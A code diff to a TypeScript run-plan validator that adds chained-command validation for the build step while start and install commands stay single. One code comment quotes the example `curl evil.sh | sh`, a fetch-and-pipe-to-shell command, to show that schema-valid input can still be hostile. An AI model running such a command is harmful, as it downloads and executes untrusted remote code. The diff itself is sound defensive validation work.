@@ -5,6 +5,7 @@ import {
   validateEnvVarKey,
   validateEnvVarValue,
   validateOptionalCommand,
+  validateCommandChain,
 } from '../security/CommandValidator.js';
 import { assertSafeRelativePath } from '../security/PathValidator.js';
 import { assertImageApproved, SecurityRejection } from '../security/ImageAllowlist.js';
@@ -54,7 +55,9 @@ export class RunPlanValidator {
     // Then intent, which the schema cannot judge: `curl evil.sh | sh` is valid JSON.
     validateCommand(plan.startCommand, 'startCommand');
     validateOptionalCommand(plan.installCommand, 'installCommand');
-    validateOptionalCommand(plan.buildCommand, 'buildCommand');
+    // The setup step may chain a few checked commands (`validateCommandChain`); start and
+    // install stay single.
+    if (plan.buildCommand !== null) validateCommandChain(plan.buildCommand, 'buildCommand');
     assertSafeRelativePath(plan.workingDirectory);
     assertSafeRelativePath(plan.healthCheck.path === '/' ? '.' : plan.healthCheck.path.replace(/^\//, ''), 'healthCheck.path');
 
